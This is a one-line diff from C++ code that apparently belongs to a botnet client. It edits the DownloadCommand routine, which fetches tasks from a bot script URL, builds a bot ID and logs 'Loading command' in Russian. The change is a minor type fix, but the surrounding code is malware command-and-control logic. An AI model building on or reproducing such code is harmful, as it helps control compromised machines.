@@ -373,7 +373,7 @@ bool DownloadCommand(PCHAR URL, PCHAR *HTMLCode)
 	if (GenerateURL)
 		URL = GetBotScriptURL(SCRIPT_TASK);
 
-	string BotID = GenerateBotID2(GetPrefix(true));
+	string BotID = GenerateBotID2(GetPrefix(true).t_str());
 
 	TASKDBG("Task", "Загружаем команду: \r\n\r\n URL - [%s]\r\n BotUID - [%s]", URL, BotID.t_str());
 
